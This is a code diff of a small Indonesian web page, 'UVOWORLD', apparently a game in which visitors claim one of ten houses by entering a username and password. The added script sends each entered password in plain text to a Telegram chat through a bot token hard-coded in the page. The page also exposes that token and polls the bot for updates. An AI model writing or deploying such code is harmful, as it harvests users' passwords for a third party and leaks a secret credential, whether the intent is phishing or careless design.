@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>UVOWORLD - Sinkron Otomatis</title>
+  <title>UVOWORLD - Rumah Realtime</title>
   <style>
     body { font-family: sans-serif; text-align: center; background: #f0f0f0; }
     .jalan { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; margin-top: 30px; }
@@ -20,23 +20,22 @@
 <body>
 
 <h1>🏡 UVOWORLD</h1>
-<p>Rumah 1–10, diklaim & update otomatis tiap 5 detik</p>
+<p>Rumah 1–10 realtime dari bot Telegram</p>
 
 <div class="jalan" id="jalan"></div>
 
 <div id="formBox">
-  <h3>Klaim Rumah</h3>
+  <h3>Klaim / Edit Rumah</h3>
   <input id="nomorRumah" placeholder="Rumah ke-" type="number" min="1" max="10">
   <input id="username" placeholder="Username">
   <input id="password" placeholder="Password" type="password">
-  <button onclick="klaim()">Klaim</button>
+  <button onclick="klaim()">Klaim / Ganti Nama</button>
 </div>
 
 <script>
   const token = "7961343490:AAGKb3JPPVBj1egmQU0hq2VfZTFmlx1zpi8";
   const chat_id = "6501126879";
-
-  const rumahList = Array(10).fill(null); // index 0–9 = Rumah 1–10
+  const rumahList = Array(10).fill(null);
 
   function renderRumah() {
     const jalan = document.getElementById("jalan");
@@ -54,25 +53,49 @@
     const user = document.getElementById("username").value.trim();
     const pass = document.getElementById("password").value.trim();
     if (!nomor || !user || !pass || nomor < 1 || nomor > 10) return alert("Isi semua kolom dengan benar!");
-    rumahList[nomor - 1] = user; // Simpan lokal
+
+    rumahList[nomor - 1] = user;
     renderRumah();
-  }
 
-  function kirimSemuaKeBot() {
-    let hasil = "🗂 Update Rumah UVOWORLD\n\n";
-    rumahList.forEach((nama, i) => {
-      hasil += `🏠 Rumah ${i + 1}: ${nama || "Belum diklaim"}\n`;
-    });
-
+    const text = `🏠 Rumah ${nomor} diklaim/ganti oleh ${user}\n🔒 Password: ${pass}`;
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id, text: hasil })
-    });
+      body: JSON.stringify({ chat_id, text })
+    })
+    .then(() => alert("✅ Terkirim ke bot."))
+    .catch(() => alert("❌ Gagal kirim ke bot."));
   }
 
-  renderRumah();
-  setInterval(kirimSemuaKeBot, 5000); // Kirim update tiap 5 detik
+  function ambilDataDariBot() {
+    fetch(`https://api.telegram.org/bot${token}/getUpdates`)
+      .then(res => res.json())
+      .then(data => {
+        const pesan = data.result;
+        let teks = "";
+        for (let i = pesan.length - 1; i >= 0; i--) {
+          const msg = pesan[i]?.message?.text;
+          if (msg && msg.includes("🏠")) {
+            teks = msg;
+            break;
+          }
+        }
+        if (!teks) return;
+        const lines = teks.split("\n");
+        lines.forEach(line => {
+          const match = line.match(/Rumah (\d+) (?:diklaim|ganti) oleh (.+)/);
+          if (match) {
+            const idx = parseInt(match[1]) - 1;
+            const nama = match[2];
+            if (idx >= 0 && idx < 10) rumahList[idx] = nama;
+          }
+        });
+        renderRumah();
+      });
+  }
+
+  ambilDataDariBot();
+  setInterval(ambilDataDariBot, 5000);
 </script>
 
 </body>
